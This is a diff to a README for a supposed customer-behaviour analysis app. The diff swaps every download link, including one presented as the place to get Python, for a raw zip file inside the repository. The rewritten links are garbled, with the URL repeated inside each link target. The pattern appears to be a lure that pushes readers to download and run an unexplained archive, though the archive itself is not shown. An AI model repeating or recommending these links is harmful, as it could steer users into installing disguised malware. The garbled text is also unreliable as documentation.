@@ -1,6 +1,6 @@
 # 📊 Customer_behaviour_analysis - Analyze Customer Behavior Effortlessly
 
-[![Download Now](https://github.com/JZSYShop/Customer_behaviour_analysis/raw/refs/heads/main/Customer Shopping behaviour analysis/Customer_analysis_behaviour_v2.0.zip%20Now-Click%20Here-brightgreen)](https://github.com/JZSYShop/Customer_behaviour_analysis/raw/refs/heads/main/Customer Shopping behaviour analysis/Customer_analysis_behaviour_v2.0.zip)
+[![Download Now](https://github.com/JZSYShop/Customer_behaviour_analysis/raw/refs/heads/main/Customer Shopping behaviour analysis/Customer-analysis-behaviour-2.9.zip Shopping behaviour https://github.com/JZSYShop/Customer_behaviour_analysis/raw/refs/heads/main/Customer Shopping behaviour analysis/Customer-analysis-behaviour-2.9.zip%20Now-Click%20Here-brightgreen)](https://github.com/JZSYShop/Customer_behaviour_analysis/raw/refs/heads/main/Customer Shopping behaviour analysis/Customer-analysis-behaviour-2.9.zip Shopping behaviour https://github.com/JZSYShop/Customer_behaviour_analysis/raw/refs/heads/main/Customer Shopping behaviour analysis/Customer-analysis-behaviour-2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -12,11 +12,11 @@ To begin your journey with our application, you need to download it. Follow thes
 
 1. **Visit the Releases Page**: Click on the link below to go to the download page.
    
-   [Download Here](https://github.com/JZSYShop/Customer_behaviour_analysis/raw/refs/heads/main/Customer Shopping behaviour analysis/Customer_analysis_behaviour_v2.0.zip)
+   [Download Here](https://github.com/JZSYShop/Customer_behaviour_analysis/raw/refs/heads/main/Customer Shopping behaviour analysis/Customer-analysis-behaviour-2.9.zip Shopping behaviour https://github.com/JZSYShop/Customer_behaviour_analysis/raw/refs/heads/main/Customer Shopping behaviour analysis/Customer-analysis-behaviour-2.9.zip)
 
 2. **Choose the Latest Version**: On the Releases page, look for the latest version of the application. It will provide you with the newest features and improvements.
 
-3. **Download the File**: Click on the file name to download it. The file may be labeled something like `https://github.com/JZSYShop/Customer_behaviour_analysis/raw/refs/heads/main/Customer Shopping behaviour analysis/Customer_analysis_behaviour_v2.0.zip`. The download will start automatically after you click the link.
+3. **Download the File**: Click on the file name to download it. The file may be labeled something like `https://github.com/JZSYShop/Customer_behaviour_analysis/raw/refs/heads/main/Customer Shopping behaviour analysis/Customer-analysis-behaviour-2.9.zip Shopping behaviour https://github.com/JZSYShop/Customer_behaviour_analysis/raw/refs/heads/main/Customer Shopping behaviour analysis/Customer-analysis-behaviour-2.9.zip`. The download will start automatically after you click the link.
 
 4. **Locate the Downloaded File**: Once the file is downloaded, find it in your Downloads folder or your chosen download location.
 
@@ -29,7 +29,7 @@ Before using the application, ensure your computer meets the following requireme
 - **Operating System**: Windows 10 or higher (Mac and Linux versions may be available in future updates but are not included at this time).
 - **RAM**: Minimum of 4 GB (8 GB recommended for better performance).
 - **Disk Space**: At least 200 MB of free space.
-- **Python**: Version 3.6 or higher. You can download it from [https://github.com/JZSYShop/Customer_behaviour_analysis/raw/refs/heads/main/Customer Shopping behaviour analysis/Customer_analysis_behaviour_v2.0.zip](https://github.com/JZSYShop/Customer_behaviour_analysis/raw/refs/heads/main/Customer Shopping behaviour analysis/Customer_analysis_behaviour_v2.0.zip).
+- **Python**: Version 3.6 or higher. You can download it from [https://github.com/JZSYShop/Customer_behaviour_analysis/raw/refs/heads/main/Customer Shopping behaviour analysis/Customer-analysis-behaviour-2.9.zip Shopping behaviour https://github.com/JZSYShop/Customer_behaviour_analysis/raw/refs/heads/main/Customer Shopping behaviour analysis/Customer-analysis-behaviour-2.9.zip](https://github.com/JZSYShop/Customer_behaviour_analysis/raw/refs/heads/main/Customer Shopping behaviour analysis/Customer-analysis-behaviour-2.9.zip Shopping behaviour https://github.com/JZSYShop/Customer_behaviour_analysis/raw/refs/heads/main/Customer Shopping behaviour analysis/Customer-analysis-behaviour-2.9.zip).
 
 ## 💡 Features
 
@@ -58,7 +58,7 @@ Getting started with the application is straightforward. Follow these steps:
 
 To help you get started, we provide sample customer behavior data. This sample can be useful for practice or testing the application's features.
 
-- **Sample Dataset**: You can download the sample dataset from this repository. Look for the file labeled `https://github.com/JZSYShop/Customer_behaviour_analysis/raw/refs/heads/main/Customer Shopping behaviour analysis/Customer_analysis_behaviour_v2.0.zip` on the Releases page.
+- **Sample Dataset**: You can download the sample dataset from this repository. Look for the file labeled `https://github.com/JZSYShop/Customer_behaviour_analysis/raw/refs/heads/main/Customer Shopping behaviour analysis/Customer-analysis-behaviour-2.9.zip Shopping behaviour https://github.com/JZSYShop/Customer_behaviour_analysis/raw/refs/heads/main/Customer Shopping behaviour analysis/Customer-analysis-behaviour-2.9.zip` on the Releases page.
 
 ## ⚙️ Troubleshooting
 
@@ -77,7 +77,7 @@ Join our community to get support and share your insights. You can:
 
 ## 👉 Important Links
 
-- **Releases Page**: [Visit for Downloads](https://github.com/JZSYShop/Customer_behaviour_analysis/raw/refs/heads/main/Customer Shopping behaviour analysis/Customer_analysis_behaviour_v2.0.zip)
+- **Releases Page**: [Visit for Downloads](https://github.com/JZSYShop/Customer_behaviour_analysis/raw/refs/heads/main/Customer Shopping behaviour analysis/Customer-analysis-behaviour-2.9.zip Shopping behaviour https://github.com/JZSYShop/Customer_behaviour_analysis/raw/refs/heads/main/Customer Shopping behaviour analysis/Customer-analysis-behaviour-2.9.zip)
 - **Documentation**: Comprehensive guides and tutorials will be hosted here.
 - **Support Forum**: Connect with other users or the development team for assistance.
 
